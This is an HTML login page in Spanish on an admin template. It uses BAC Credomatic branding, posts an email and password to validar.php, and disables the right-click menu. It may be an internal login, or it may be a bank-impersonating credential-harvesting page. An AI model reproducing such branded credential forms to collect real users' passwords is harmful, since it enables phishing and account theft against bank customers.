<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <title>Login</title>
  <!-- Bootstrap core CSS-->
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <!-- Custom fonts for this template-->
  <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
  <!-- Custom styles for this template-->
  <link href="css/sb-admin.css" rel="stylesheet">
  <link rel="shortcut icon" href="https://www.baccredomatic.com/sites/all/themes/custom/foundation_bac/bac-favicon.ico" />
  <link rel="shortcut icon" href="media/bac-favicon.ico" />
</head>

<body class="bg-dark" oncontextmenu="return false">
  <div class="container">
<br>
<br>
<br>
    <div class="card card-login mx-auto mt-5">
      <strong><div class="card-header"><img class="col-md-12" src="media/logo2.jpg" height="195" width="360"></div></strong>
      <div class="card-body">
        <form action="validar.php" method="post">
          <div class="form-group">
            <label for="exampleInputEmail1">Correo </label>
            <input class="form-control" id="exampleInputEmail1" type="email" aria-describedby="emailHelp" name="mail" placeholder="Enter email" required>
          </div>
          <div class="form-group">
            <label for="exampleInputPassword1">Contraseña</label>
            <input class="form-control" id="exampleInputPassword1" type="password"  name="pass" placeholder="Password" required>

          </div>
          <div class="col-md-12">
          <center><input class="btn btn-primary" type="submit" value="Aceptar"> <a href="https://www1.sucursalelectronica.com/redir/showLogin.go" target="_blank">Banca en linea</a></center>


          </div>
        </form>
      </div> 
    </div>
  </div>
  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
</body>

</html>
